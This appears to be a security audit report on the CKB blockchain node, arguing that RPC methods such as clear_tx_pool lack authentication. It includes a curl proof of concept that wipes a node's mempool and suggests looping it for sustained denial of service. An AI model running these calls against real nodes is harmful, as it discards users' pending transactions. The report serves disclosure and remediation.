### Title
Missing Access Control on `clear_tx_pool` RPC Method Enables Unauthenticated Mempool Wipe - (File: rpc/src/module/pool.rs)

### Summary

The `clear_tx_pool` RPC method in CKB's Pool module performs a complete wipe of all pending transactions from the mempool without any caller authentication or authorization check. The Pool module is enabled by default in production. Because the CKB RPC server has no built-in authentication mechanism, any process with access to the RPC port — including any unprivileged local process or a remote caller if the port is exposed — can invoke this destructive operation. This is a direct structural analog to the reported `RM_UpdateReward` missing access control: a privileged, state-mutating operation is callable by anyone with network access to the endpoint.

### Finding Description

In `rpc/src/module/pool.rs`, the `clear_tx_pool` implementation at line 684 directly dispatches `tx_pool.clear_pool(snapshot)` with no caller identity check, no token, and no role guard of any kind:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

The same pattern applies to `clear_tx_verify_queue` (line 694) and `remove_transaction` (line 662) — all three are state-mutating, destructive operations with zero access control.

The Pool module is listed in the default production module set in `resource/ckb.toml`:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

The RPC server itself (`rpc/src/server.rs`, `rpc/src/service_builder.rs`) has no authentication layer. The `parse_authorization` function in `miner/src/client.rs` is only for the miner *client* connecting outbound to the node — it is not a server-side auth gate. There is no per-method or per-module caller verification anywhere in the RPC stack.

The downstream effect of `clear_tx_pool` is confirmed in `tx-pool/src/service.rs` at line 972–980: the message handler calls `service.clear_pool(new_snapshot).await`, which unconditionally empties the entire pending and proposed transaction set.

### Impact Explanation

Any caller with TCP access to the RPC port can:

1. Issue a single unauthenticated HTTP POST to `clear_tx_pool` and atomically drop every pending transaction from the mempool.
2. Issue repeated calls to `remove_transaction` to selectively censor specific transactions by hash.
3. Issue `clear_tx_verify_queue` to drain the verification pipeline, stalling in-flight transaction processing.

The result is a complete, repeatable mempool DoS: all user-submitted transactions are silently discarded and must be resubmitted. An attacker can loop this call to prevent any transaction from ever accumulating enough confirmations to be mined, effectively halting transaction throughput on the targeted node.

### Likelihood Explanation

The RPC binds to `127.0.0.1:8114` by default, which limits the direct remote attack surface. However, the attacker surface is still realistic:

- **Any unprivileged local process** on the same host (e.g., a compromised web app, a malicious npm package in a co-located service, a container with host-network access) can reach `127.0.0.1:8114` and call `clear_tx_pool` with a single HTTP request.
- **SSRF**: Any web service co-located on the node host that is vulnerable to SSRF can be weaponized to issue the call.
- **Exposed deployments**: Operators who follow common cloud patterns (binding to `0.0.0.0` or using a reverse proxy without auth) expose the port to the internet. The README warns against this but provides no enforcement mechanism.
- The call requires zero credentials, zero PoW, and zero protocol knowledge beyond a single JSON-RPC line.

### Recommendation

1. **Add an authentication layer to the RPC server.** Implement HTTP Basic Auth or a bearer-token check at the server level (not just the miner client). Gate all state-mutating Pool methods (`clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`) behind this check.
2. **Move destructive pool operations to a separate, non-default module** (analogous to the existing `IntegrationTest` module pattern) so they are opt-in and clearly scoped.
3. **Add a per-method allowlist** in `service_builder.rs` that rejects calls to destructive methods unless a configured secret header or token is present.

### Proof of Concept

With a default CKB node running locally, submit a transaction and then wipe the mempool with no credentials:

```bash
# Step 1: Submit a transaction (normal user action)
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[{...}],"id":1}'

# Step 2: Attacker (any local process, no auth) wipes the entire mempool
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"jsonrpc":"2.0","result":null,"id":2}

# Step 3: Verify mempool is empty
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":3}'
# pending: "0x0", proposed: "0x0"
```

The attacker can repeat Step 2 in a tight loop to prevent any transaction from surviving long enough to be mined, achieving sustained mempool DoS with negligible cost.

**Root cause lines:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-701)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/service.rs (L972-980)
```rust
        Message::ClearPool(Request {
            responder,
            arguments: new_snapshot,
        }) => {
            service.clear_pool(new_snapshot).await;
            if let Err(e) = responder.send(()) {
                error!("Responder sending clear_pool failed {:?}", e)
            };
        }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
